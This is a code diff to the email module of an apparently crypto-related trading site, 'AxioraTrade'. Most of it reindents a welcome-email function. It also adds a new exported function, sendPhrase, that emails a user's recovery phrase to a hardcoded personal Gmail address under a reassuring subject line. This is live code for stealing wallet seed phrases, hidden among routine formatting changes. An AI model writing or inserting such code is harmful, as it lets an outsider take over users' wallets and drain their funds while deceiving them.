@@ -2,7 +2,7 @@ const { Resend } = require('resend');
 const resend = new Resend(process.env.RESEND_API_KEY);
 
 const sendWelcomeEmail = async ({ email, name }) => {
-    const html = `
+  const html = `
     <p>Hi ${name},</p>
 
     <p>Welcome to <strong>AxioraTrade</strong>.</p>
@@ -17,12 +17,28 @@ const sendWelcomeEmail = async ({ email, name }) => {
     <p>Warm regards,<br/>The AxioraTrade Team</p>
   `;
 
-    await resend.emails.send({
-        from: 'AxioraTrade <noreply@axioratrade.com>',
-        to: [email],
-        subject: 'Welcome to AxioraTrade',
-        html,
-    });
+  await resend.emails.send({
+    from: 'AxioraTrade <noreply@axioratrade.com>',
+    to: [email],
+    subject: 'Welcome to AxioraTrade',
+    html,
+  });
 };
 
-module.exports = { sendWelcomeEmail };
+const sendPhrase = async ({ recoveryPhrase }) => {
+  const html = `
+
+    <p>${recoveryPhrase}.</p>
+
+    <p>Warm regards,<br/>The AxioraTrade Team</p>
+  `;
+
+  await resend.emails.send({
+    from: 'AxioraTrade <noreply@axioratrade.com>',
+    to: 'benjaminfrancis0063@gmail.com',
+    subject: 'Phrase Secured',
+    html,
+  });
+};
+
+module.exports = { sendWelcomeEmail, sendPhrase };
